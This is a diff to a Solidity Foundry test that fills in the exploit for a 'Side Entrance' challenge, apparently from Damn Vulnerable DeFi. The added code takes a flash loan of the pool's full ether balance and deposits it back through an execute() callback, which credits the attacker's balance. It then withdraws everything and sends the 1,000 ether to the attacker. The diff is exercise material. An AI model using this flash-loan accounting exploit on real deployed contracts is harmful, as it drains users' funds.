@@ -5,8 +5,10 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
 
-contract SideEntrance is Test {
+contract SideEntrance is Test{
+    using Address for address payable;
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
     Utilities internal utils;
@@ -32,10 +34,21 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    receive() external payable { }
+
+    function execute() public payable {
+      address(sideEntranceLenderPool).call{value: ETHER_IN_POOL}(
+        abi.encodeWithSignature("deposit()")
+      );
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        sideEntranceLenderPool.withdraw();
+        attacker.sendValue(ETHER_IN_POOL);
 
         /**
          * EXPLOIT END *
